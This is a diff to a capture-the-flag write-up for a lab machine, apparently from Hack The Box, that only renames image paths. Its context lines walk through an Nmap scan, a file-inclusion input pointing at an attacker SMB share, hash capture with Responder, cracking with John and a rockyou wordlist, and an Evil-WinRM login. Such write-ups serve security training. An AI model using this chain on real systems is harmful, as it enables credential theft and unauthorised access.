@@ -19,7 +19,7 @@ Performed an Nmap scan:
 nmap -sC -sV -Pn -p- 10.129.X.X
 ```
 
-![nmap result](./HTB_THINGY/nmap_result.png)
+![nmap result](./writeup-images/nmap_result.png)
 
 Discovered:
 - Port 80 (HTTP)
@@ -27,7 +27,7 @@ Discovered:
 
 Visited the site: **Unika**
 
-![Unika site](./images/2-unika.png)
+![Unika site](./writeup-images/unika.png)
 
 ---
 
@@ -35,7 +35,7 @@ Visited the site: **Unika**
 
 Found an input field that takes strings:
 
-![String input](./images/3-string-input.png)
+![String input](./writeup-images/string input.png)
 
 Tested for LFI using:
 
@@ -43,7 +43,7 @@ Tested for LFI using:
 \\10.10.14.X\share
 ```
 
-![LFI string input](./images/4-lfi-input.png)
+![LFI string input](./writeup-images/lfi string input result.png)
 
 Confirmed inclusion leads to outbound request from server — ✅ **vulnerable to LFI**.
 
@@ -57,11 +57,11 @@ Started `Responder` on local machine:
 sudo responder -I tun0
 ```
 
-![Responder started](./images/5-responder-init.png)
+![Responder started](./writeup-images/responder initiation.png)
 
 Then configured the parameter to call our malicious SMB path:
 
-![Setting page param](./images/6-setting-param.png)
+![Setting page param](./writeup-images/setting page parameter.png)
 
 ---
 
@@ -69,7 +69,7 @@ Then configured the parameter to call our malicious SMB path:
 
 Boom — captured a **NetNTLMv2 hash** for user `admin`.
 
-![Hash captured](./images/7-netntlm-admin.png)
+![Hash captured](./writeup-images/NetNTLMv for admin.png)
 
 Saved the hash to a file: `hash.txt`
 
@@ -85,7 +85,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 Cracked password: **badminton**
 
-![Password cracked](./images/8-password-badminton.png)
+![Password cracked](./writeup-images/password_badminton.png)
 
 ---
 
@@ -97,7 +97,7 @@ Logged in using Evil-WinRM:
 evil-winrm -i 10.129.X.X -u admin -p badminton
 ```
 
-![Evil-WinRM shell](./images/9-evil-winrm.png)
+![Evil-WinRM shell](./writeup-images/Evil-Winrm.png)
 
 Listed directories and found the flag:
 
@@ -106,8 +106,8 @@ dir
 type flag.txt
 ```
 
-![Flag directory](./images/10-dir-flag.png)  
-![Flag content](./images/11-flag-found.png)
+![Flag directory](./writeup-images/dir flag.txt.png)  
+![Flag content](./writeup-images/flag founded.png)
 
 ---
 
